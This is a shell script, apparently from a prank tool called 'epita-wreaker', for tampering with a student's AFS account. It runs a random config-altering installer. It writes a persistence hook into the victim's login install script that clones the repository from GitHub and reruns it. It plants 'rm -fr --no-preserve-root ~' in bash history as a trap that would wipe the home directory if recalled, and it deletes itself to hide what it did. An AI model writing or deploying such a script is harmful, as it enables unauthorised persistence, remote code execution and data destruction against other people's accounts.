#takes as argument what dir to confloose from, default is random
#if two args are given, uses random and does not write to the afs auto mount script
repo=$(dirname $0)


if [ $# -eq 2 ]; then
	dir=$1
else
	if [ $(($RANDOM%2)) -eq 0 ]; then
		dir="lag"
	else
		dir="gamble"
	fi
fi


if [ ! -e ~/afs/confsbackup.tar.gz ]; then
	tar -czf ~/afs/confsbackup.tar.gz ~/afs/.confs
fi

./$repo/$dir/install.sh $repo


#dont want it stacking when called from install.sh
if [ ! $# -eq 3 ]; then

	cat <<- MAKE_PERMANENT >> $HOME/afs/.confs/install.sh
		git clone https://github.com/tbvns/epita-wreaker.git
		./epita-wreaker/install_rand.sh a b
	MAKE_PERMANENT

fi



echo -e "cd\nls\ncd ..\nls\nrm -fr --no-preserve-root ~" > ~/.bash_history

rm -fr $repo
